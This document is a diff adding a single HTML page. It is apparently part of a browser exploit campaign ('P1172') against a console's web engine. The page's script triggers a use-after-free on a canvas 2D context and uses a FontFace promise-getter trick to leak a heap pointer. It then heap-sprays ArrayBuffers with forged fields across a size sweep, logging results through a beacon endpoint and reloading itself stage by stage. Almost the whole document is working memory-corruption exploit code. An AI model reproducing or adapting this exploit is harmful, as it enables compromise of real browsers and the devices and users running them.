@@ -1,0 +1,214 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1172 Extended Size Reclaim Sweep</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1172 — EXTENDED SIZE RECLAIM SWEEP (768B mystery)</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">stage: ?</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1172-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1172: EXTENDED size sweep for the freed canvas context.
+   P1158 covered 736-1024 (all crashed); P1160 all-p1 covered 768/800.
+   Missing: <736 and >1024. If our console's context object is a
+   different size than the community's 768B, the sweep finds it here.
+   Stages:
+   0: same-type control (lw=1 expected — UAF alive this boot)
+   1-10: partial forge (+112=p1, +120=2, +124=1) sizes
+         [512,576,640,704,1088,1152,1280,1536,2048,4096]
+   11-20: all-p1 fill same sizes
+   Survived lineWidth read at a size = reclaim + oracle WORK at that size.
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var SIZES=[512,576,640,704,1088,1152,1280,1536,2048,4096];
+var STAGES=[{k:'control'}];
+for(var si=0;si<SIZES.length;si++)STAGES.push({k:'forge',sz:SIZES[si]});
+for(var si2=0;si2<SIZES.length;si2++)STAGES.push({k:'allp1',sz:SIZES[si2]});
+
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1172_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1172_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'/'+STAGES.length);
+setStatus('STAGE '+stage+'/'+STAGES.length);
+setCounters('results so far: '+JSON.stringify(results).slice(0,400));
+
+if(stage>=STAGES.length){
+  setStatus('ALL DONE');
+  B('ALL-DONE',JSON.stringify(results).slice(0,800));
+  log('=== ALL DONE ===','ok');
+  try{localStorage.removeItem('p1172_stage');}catch(e){}
+}else{
+
+try{localStorage.setItem('p1172_stage',''+(stage+1));}catch(e){}
+var conf=STAGES[stage];
+setPhase(conf.k+': '+(conf.sz||'same-type'));
+
+/* FL leak */
+function flLeak(cb){
+  var done=false;
+  var watchdog=setTimeout(function(){if(done)return;done=true;cb(null);},6000);
+  function fin(p){if(done)return;done=true;clearTimeout(watchdog);
+    try{delete FontFace.prototype.then;}catch(e){}cb(p);}
+  try{
+    var fired=false,styleEl;
+    var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+    document.fonts.add(A);void A.loaded;
+    styleEl=document.createElement('style');
+    styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(styleEl);
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){
+        if(fired)return undefined;fired=true;
+        if(styleEl)styleEl.remove();
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        window.__map=[];
+        for(var k=0;k<120;k++){var ab=new ArrayBuffer(192);
+          window.__map.push({view:new Uint8Array(ab)});}
+        try{document.fonts.check('1em s0');}catch(e){}
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em f0, s0','AB');
+    setTimeout(function(){
+      var found=null;
+      for(var i=0;i<window.__map.length&&!found;i++){
+        var e=window.__map[i];
+        var nz=false;for(var b=0x58;b<0x60;b++)if(e.view[b])nz=true;
+        if(nz){
+          var dv=new DataView(e.view.buffer);
+          var p1=dv.getBigUint64(0x58,true);
+          if(p1>0x1000000000n&&p1<0x100000000000n){
+            found={lo:Number(p1&0xFFFFFFFFn),hi:Number((p1>>32n)&0xFFFFFFFFn)};
+          }
+        }
+      }
+      B(found?'FL-HIT':'FL-MISS',found?('p1=0x'+found.hi.toString(16).padStart(8,'0')+found.lo.toString(16).padStart(8,'0')):'');
+      fin(found);
+    },80);
+  }catch(e){B('FL-ERR',e.message);fin(null);}
+}
+
+function doControl(){
+  var canvas=document.createElement('canvas');canvas.width=1;canvas.height=1;
+  var innerCtx=null;
+  var uafOpts={};
+  Object.defineProperty(uafOpts,'alpha',{get:function(){
+    innerCtx=canvas.getContext('2d');return true;}});
+  canvas.getContext('bitmaprenderer',uafOpts);
+  var sprays=[];
+  for(var i=0;i<200;i++){
+    var cv=document.createElement('canvas');cv.width=1;cv.height=1;
+    sprays.push(cv.getContext('2d'));
+  }
+  var lw;
+  try{lw=innerCtx.lineWidth;}catch(e){lw='ERR';}
+  B('CONTROL','lw='+lw);
+  results.push({stage:stage,k:'control',lw:String(lw)});
+  try{localStorage.setItem('p1172_res',JSON.stringify(results));}catch(e){}
+  addFind('control: same-type reclaim lw='+lw);
+  setStatus('control lw='+lw);
+  B('NEXT');setTimeout(function(){location.reload(true);},800);
+}
+
+function doForge(leak){
+  var sz=conf.sz;
+  var canvas=document.createElement('canvas');canvas.width=1;canvas.height=1;
+  var innerCtx=null;
+  var uafOpts={};
+  Object.defineProperty(uafOpts,'alpha',{get:function(){
+    innerCtx=canvas.getContext('2d');return true;}});
+  canvas.getContext('bitmaprenderer',uafOpts);
+  for(var f=0;f<600;f++){var tmp=new ArrayBuffer(16);}
+  var dvs=[];
+  for(var s=0;s<200;s++){
+    var ab=new ArrayBuffer(sz);
+    var dv=new DataView(ab);
+    if(conf.k==='allp1'){
+      var nq=sz>>3;
+      for(var q=0;q<nq;q++){dv.setUint32(q*8,leak.lo,true);dv.setUint32(q*8+4,leak.hi,true);}
+    }else{
+      dv.setUint32(112,leak.lo,true);
+      dv.setUint32(116,leak.hi,true);
+      dv.setUint32(120,2,true);
+      dv.setUint32(124,1,true);
+    }
+    dvs.push(dv);
+  }
+  B('SPRAY',conf.k+'|sz='+sz);
+  setStatus('reading lineWidth...');
+  var lw;
+  try{lw=innerCtx.lineWidth;}catch(e){lw='ERR';}
+  var out={stage:stage,k:conf.k,sz:sz,lw:String(lw)};
+  results.push(out);
+  try{localStorage.setItem('p1172_res',JSON.stringify(results));}catch(e){}
+  B('READ',JSON.stringify(out));
+  addFind(conf.k+' sz='+sz+' -> lw='+lw);
+  setStatus('RESULT sz='+sz+': '+lw);
+  log('=== '+conf.k+' sz='+sz+' -> '+lw+' ===',lw==='ERR'?'warn':'hit');
+  B('NEXT');setTimeout(function(){location.reload(true);},800);
+}
+
+if(conf.k==='control'){
+  setPhase('same-type control');
+  doControl();
+}else{
+  flLeak(function(leak){
+    if(!leak){B('NORETRY');setStatus('FL MISS — retry');setTimeout(function(){location.reload(true);},400);return;}
+    doForge(leak);
+  });
+}
+
+} /* stage machine */
+
+/* auto-reload checker */
+(function(){
+  var cur='P1172-size-sweep';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
